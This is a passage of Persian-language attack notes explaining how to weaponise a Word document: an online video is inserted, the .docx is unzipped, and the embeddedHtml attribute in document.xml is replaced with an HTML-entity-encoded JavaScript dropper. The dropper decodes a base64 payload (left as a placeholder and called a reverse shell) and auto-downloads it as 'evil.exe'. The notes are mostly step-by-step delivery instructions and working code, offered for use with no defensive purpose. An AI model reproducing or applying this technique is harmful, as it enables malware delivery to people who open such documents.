
https://mothereff.in/html-entities



در این تکنیک ما قصد داریم که یک سند ورد درست کنیم و منابع انلاینی که ماکروسافت در اختیار ما قرار داده رو بیایم از طریق این منابع به صورت انلاین یک ویدیو رو insert کنیم داخل سند ورد که در قدم بعدی بیایم و اون سند رو از پسوند نرمالش که میشه .docx تبدیل کنیم به .zip به این دلیل که ما با انجام دادن اینکار میتونیم بیایم و به جزیاتی که داخل یک سند ورد وجود دارد برسیم مثلا اینکه این سند از چه ورژن office استفاده میکند چه تنظیماتی لحاظ شده و موارد این چنین رو در قالب یک فایل .xml ببینیم 


![[Pasted image 20251104222824.png]]

![[Pasted image 20251104222848.png]]


پس ما بعد از اینکه اومدیم و ویدیو مد نظرمون رو اپلود کردیم داخل سند میایم و پسوند اون رو از .docx به .zip تبدیل میکنیم تا در قدم بعدی به محتوای xml اون سند دسترسی پیدا کنیم بتونیم تغییری داخلش اعمال کنیم 


![[Pasted image 20251104223058.png]]

بعد از اینکه پسوند رو به  .zip  تغییر دادیم وارد فایل document.xml میشیم که این فایل در اصل اطلاعات اصلی سند را دارد که کاربر داخلش لحاظ کرده ماننده  جملات و ویدیو یی که insert کرده و........


![[Pasted image 20251104223308.png]]

وقتی که بازش کردیم به بخشی میایم که متغیر `embeddedHtml` دارد به این متغیر را با payload جاوااسکریپت خودمون تغییر میدیم تا این payload بره و برای ما Malware رو دانلود و بارگذاری کنه روی سیستم 

```
```
<html>
    <body>
        <script>
            function base64ToArrayBuffer(base64) {
            var binary_string = window.atob(base64);
            var len = binary_string.length;
            
            var bytes = new Uint8Array( len );
                for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
                return bytes.buffer;
            }

            // 32bit simple reverse shell
            var file = <paste payload in base65> /// base64 payload
			var data = base64ToArrayBuffer(file);
            var blob = new Blob([file], {type: 'octet/stream'});
            var fileName = 'evil.exe';

            if (window.navigator.msSaveOrOpenBlob) {
                window.navigator.msSaveOrOpenBlob(blob,fileName);
            } else {
                var a = document.createElement('a');
                console.log(a);
                document.body.appendChild(a);
                a.style = 'display: none';
                var url = window.URL.createObjectURL(blob);
                a.href = url;
                a.download = fileName;
                a.click();
                window.URL.revokeObjectURL(url);
            }
        </script>
    </body>
</html>
```
```

این میشه payload ما برای قرار دادن در این قسمت تا اون قسمتی هایلایت شده در تصویر پاک میکنیم و با payload جاوااسکریپت مون عوض میکنیم اما یه نکته یی که وجود داره قبل از اینکه Payload رو جایگذاری کنیم این است که باید فرمتی که در اون attribute یعنی embeddedHtml وارد میکنیم باید encode شده به صورت  HTML entity باشد به این دلیل که **مقدار attribute اجازه‌ی کاراکترهای `<` و `>` خام را ندارد.**
اگر بخواهی مقدار یک attribute را به‌صورت `" <script> ... </script> "` قرار دهی، XML خراب می‌شود چون `<` شروعِ یک تگ جدید محسوب می‌شود و parser خطا می‌دهد. باید `"<"` را تبدیل کنی (مثلاً `&lt;` یا `&#x3C;`) تا داخل attribute امن باشد.

مثالِ خراب (باعث خطای XML می‌شود):
```
embeddedHtml="<script>console.log('hi');</script>"
```

نسخهٔ درست (escape شده):
```
embeddedHtml="&lt;script&gt;console.log(&#39;hi&#39;);&lt;/script&gt;"
```

**قواعد Word/OpenXML**  
بعضی از قسمت‌های Word (مثل `wp15:webVideoPr` و attribute `embeddedHtml`) طراحی شده‌اند تا یک رشتهٔ HTMLِ ایزوله‌شده به عنوان _متنِ attribute_ بگیرند — و آن رشته باید XML-safe باشد. این یک الزام فرمت است، نه یک انتخاب.

به همین دلیل ما از طریق یک سایت ماننده https://mothereff.in/html-entities میایم و payload مون رو encode شده درون attribute قرار میدیم تا درست کار کند
و بعد از این مرحله کارمون تمومه فایل رو سیو میکنیم و فایل رو از حالت zip به حالت docx بر میگردونیم 